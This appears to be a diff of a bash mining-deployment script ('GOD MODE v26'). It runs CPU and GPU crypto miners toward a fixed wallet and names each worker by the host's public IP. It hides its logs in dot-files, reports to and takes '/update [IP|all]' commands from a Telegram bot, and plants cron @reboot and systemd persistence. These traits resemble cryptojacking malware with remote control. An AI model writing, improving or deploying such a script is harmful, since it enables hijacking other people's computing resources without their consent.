@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ============================================================
-# | GOD MODE v25: KRYPTEX PEARL (PRL) OFFICIAL ENGINE        |
+# | GOD MODE v26: NON-BLOCKING SPEED DEMON (FULL RELEASE)    |
 # ============================================================
 
 # [ CONFIGURATION ]
@@ -42,11 +42,11 @@ LOG_CPU="$BASE_DIR/.cpu_data.log"
 LOG_GPU="$BASE_DIR/.gpu_data.log"
 
 # ----------------------------------------------------
-# [ PHASE 1: WORKER & HARDWARE DETECTION ]
+# [ PHASE 1: FAST IP & HARDWARE DETECTION ]
 # ----------------------------------------------------
 get_worker() {
     local ip
-    ip=$(curl -s -m 3 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
+    ip=$(curl -s -m 2 --connect-timeout 2 api.ipify.org || curl -s -m 2 --connect-timeout 2 icanhazip.com || curl -s -m 2 --connect-timeout 2 ifconfig.me || wget -qO- -t 1 -T 2 ifconfig.me 2>/dev/null)
     [ -z "$ip" ] && ip="111.111.111.111"
     
     local safe_worker
@@ -55,10 +55,14 @@ get_worker() {
     echo "${FIXED_WALLET_ID}.${safe_worker}"
 }
 WORKER=$(get_worker)
-SERVER_IP=$(curl -s -m 3 --connect-timeout 2 ifconfig.me || echo "Unknown-IP")
+SERVER_IP=$(curl -s -m 2 --connect-timeout 2 api.ipify.org || curl -s -m 2 --connect-timeout 2 icanhazip.com || echo "Unknown-IP")
 
 detect_gpu() {
     if [ -d "/proc/driver/nvidia" ] || [ -c "/dev/nvidia0" ] || [ -d "/sys/class/drm/card0" ]; then
+        echo "1"
+        return
+    fi
+    if command -v nvidia-smi >/dev/null 2>&1; then
         echo "1"
         return
     fi
@@ -114,7 +118,7 @@ cat <<EOF > config.json
 }
 EOF
 
-# GPU Setup (Удаляем старый бинарник, если это не чистый SRBMiner)
+# GPU Setup (Авто-чистка старых бинарников)
 if [ "$HAS_GPU" -eq 1 ]; then
     NEED_INSTALL=0
     if [ ! -f "$BIN_GPU" ]; then
@@ -169,7 +173,7 @@ PAUSED=0
 
 send_tg_msg() {
     local msg="\$1"
-    curl -s -m 5 --connect-timeout 3 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
+    curl -s -m 4 --connect-timeout 2 -X POST "https://api.telegram.org/bot\$TG_BOT_TOKEN/sendMessage" \
          -d chat_id="\$TG_CHAT_ID" \
          -d text="\$msg" \
          -d parse_mode="HTML" > /dev/null 2>&1
@@ -299,7 +303,7 @@ send_logs_report() {
     send_tg_msg "\$msg"
 }
 
-STARTUP_MSG="🚀 <b>ENGINE V25 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
+STARTUP_MSG="🚀 <b>ENGINE V26 ACTIVE</b>%0A🌐 <b>IP:</b> <code>\$SERVER_IP</code>%0A🆔 <b>Worker:</b> <code>\$WORKER</code>%0A💡 <i>Use /update [IP|all] to deploy changes.</i>"
 send_tg_msg "\$STARTUP_MSG"
 
 while true; do
@@ -324,8 +328,7 @@ while true; do
             if [ -f "./\$BIN_GPU" ]; then
                 if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                     chmod +x "./\$BIN_GPU"
-                    # Флаг --algorithm-gpu pearlhash по официальному мануалу Крыптекса
-                    nohup ./\$BIN_GPU --algorithm-gpu pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --disable-cpu >> "\$LOG_GPU" 2>&1 &
+                    nohup ./\$BIN_GPU --algorithm-gpu pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
                     sleep 2
                     if ! pgrep -f "\$BIN_GPU" > /dev/null; then
                         GPU_STATUS="🔴 Offline / Crashed"
@@ -343,7 +346,7 @@ while true; do
     [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
 
     # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
-    LAST_CMD=\$(curl -s -m 3 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
+    LAST_CMD=\$(curl -s -m 2 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
     UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
 
     if [ -n "\$UPDATE_ID" ]; then
@@ -422,12 +425,12 @@ pkill -9 -f "watchdog.sh" 2>/dev/null
 # [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
 # ----------------------------------------------------
 echo "================================================="
-echo "[+] ENGINE V25 INITIALIZED"
+echo "[+] ENGINE V26 INITIALIZED"
 echo "[+] Server IP: $SERVER_IP"
 echo "[+] Worker ID: $WORKER"
 echo "================================================="
 echo "[+] Igniting core engines..."
-sleep 3
+sleep 2
 
 echo "-------------------------------------------------"
 echo "[+] CPU ENGINE STATUS:"
@@ -473,7 +476,7 @@ echo "================================================="
 if command -v crontab >/dev/null 2>&1; then
     (timeout 2 crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
      echo "@reboot $BASE_DIR/watchdog.sh"; \
-     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | timeout 3 crontab - 2>/dev/null
+     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | timeout 2 crontab - 2>/dev/null
 fi
 
 if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
